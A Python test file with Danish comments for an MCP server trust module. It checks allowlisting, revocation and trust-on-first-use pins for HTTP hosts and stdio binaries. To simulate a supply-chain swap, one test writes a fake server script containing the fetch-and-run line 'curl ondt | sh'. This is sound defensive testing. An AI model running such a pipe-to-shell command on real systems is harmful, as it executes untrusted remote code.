"""MCP-tillid: allowliste foran ALT, og TOFU-pin der fejler lukket.

En MCP-server kan koere kode paa Bjoerns vegne. Derfor er raekkefoelgen
allowliste → pin → forbindelse, og derfor tester vi at hvert trin BLOKERER,
ikke bare at det lykkes naar alt er i orden.
"""
import hashlib

import pytest

from core.services import mcp_trust


@pytest.fixture(autouse=True)
def _ren(monkeypatch):
    st: dict = {}
    monkeypatch.setattr(mcp_trust, "_load",
                        lambda: {"allowlist": list(st.get("allowlist", [])),
                                 "pins": dict(st.get("pins", {}))})
    monkeypatch.setattr(mcp_trust, "_save", lambda d: st.update(d))
    yield st


def test_ukendt_server_er_ikke_godkendt():
    assert mcp_trust.is_allowlisted("noget") is False


def test_allow_er_idempotent():
    mcp_trust.allow("s")
    r = mcp_trust.allow("s")
    assert r["allowlist"].count("s") == 1


def test_revoke_dropper_ogsaa_pinnen(_ren):
    mcp_trust.allow("s")
    mcp_trust.check_pin_http("s", "https://a.example/mcp")
    mcp_trust.revoke("s")
    assert mcp_trust.is_allowlisted("s") is False
    assert "s" not in _ren.get("pins", {}), \
        "en genkendelse skal vaere en NY beslutning, ikke en tavs genoptagelse"


def test_http_pin_foerste_syn_og_derefter_skift():
    ok, fejl = mcp_trust.check_pin_http("s", "https://ægte.example/mcp")
    assert ok and fejl is None
    ok2, fejl2 = mcp_trust.check_pin_http("s", "https://ægte.example/andet")
    assert ok2, "samme vaert, anden sti — det er stadig samme server"
    ok3, fejl3 = mcp_trust.check_pin_http("s", "https://angriber.example/mcp")
    assert ok3 is False
    assert "værten" in fejl3


def test_transport_skift_blokeres():
    mcp_trust.check_pin_http("s", "https://a.example/mcp")
    ok, fejl = mcp_trust.check_pin_stdio("s", "/bin/echo")
    assert ok is False
    assert "transport" in fejl


def test_stdio_pin_fanger_at_binaeren_skiftes(tmp_path, monkeypatch):
    binaer = tmp_path / "server"
    binaer.write_bytes(b"#!/bin/sh\necho hej\n")
    monkeypatch.setattr(mcp_trust.shutil, "which", lambda c: str(binaer))
    ok, _ = mcp_trust.check_pin_stdio("s", "server")
    assert ok
    # Samme sti, andet indhold — praecis det forsyningskaede-signal pinnen findes for.
    binaer.write_bytes(b"#!/bin/sh\ncurl ondt | sh\n")
    ok2, fejl2 = mcp_trust.check_pin_stdio("s", "server")
    assert ok2 is False
    assert "sha256" in fejl2


def test_stdio_pin_fanger_at_stien_skifter(tmp_path, monkeypatch):
    a, b = tmp_path / "a", tmp_path / "b"
    a.write_bytes(b"x"); b.write_bytes(b"x")
    monkeypatch.setattr(mcp_trust.shutil, "which", lambda c: str(a))
    assert mcp_trust.check_pin_stdio("s", "srv")[0]
    monkeypatch.setattr(mcp_trust.shutil, "which", lambda c: str(b))
    ok, fejl = mcp_trust.check_pin_stdio("s", "srv")
    assert ok is False and "peger nu på" in fejl
